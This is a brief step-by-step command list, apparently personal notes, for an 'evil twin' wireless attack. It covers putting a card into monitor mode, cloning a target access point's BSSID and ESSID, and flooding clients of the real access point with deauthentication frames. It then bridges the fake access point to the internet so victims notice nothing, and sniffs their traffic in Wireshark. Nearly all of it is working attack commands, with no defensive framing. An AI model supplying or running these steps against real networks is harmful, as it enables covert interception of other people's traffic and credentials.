1. Cloning the router config so that new connections passes through your access point
2. Initial setup
    - Set network wireless card to monitor mode. Use `ifconfig` to get the wireless card name
    - `ifconfig en0 down` : turn down wireless card
    - `iwconfig en0 mode monitor` : Set wireless card mode to monitor.
    - `ifconfig en0 up` : Start wireless card
    - `airmon-ng check en0` : It checks if any running processes might interfere with the cracking process.
    - If above command list any process, then kill those processes using kill command. Eg. NetworkManager, dhclient, `kill <PID>`
    - `airodump-ng en0` : Checks the available network connections nearby that are compatible to en0.
    - Check the 'PWR' field in output from above command. if 'PWR' is less than approx -60, that reaver will work on it
    - Copy the BSSID and channel number for the target wireless network
3. `airbase-ng -a BSSID --essid "<target essid> -c <target channel>" en0`
    - BSSID : mac address of target access point
    - target essid : essid of target access point
    - target channel : channel of target access point
    - en0 : en0 will clone target access point
4. Deauthentication:
    - run `aireplay-ng -0 0 -a <target BSSID> en0 `

5. Create bridge between your router to internet : So that all the request coming to your interface will go to internet without creating any suspicion
    - `apt-get install bridge-utils -y`
    - `brctl addbr evil` : creates a new bridge with name 'evil'
    - `brctl addif evil en0` : Bridge evil with en0 interface
    - `brctl addif evil at0` : Bridge evil with at0 interface. at0 is created by airbase-ng
    - `ifconfig at0 0.0.0.0 up`
    - `ifconfig evil up`
    - `dhclient evil`
6. Sniffing :
    - `apt-get install -y wireshark wireshark-gnome`
    - Open wireshark and check the traffic going through 'evil' interface
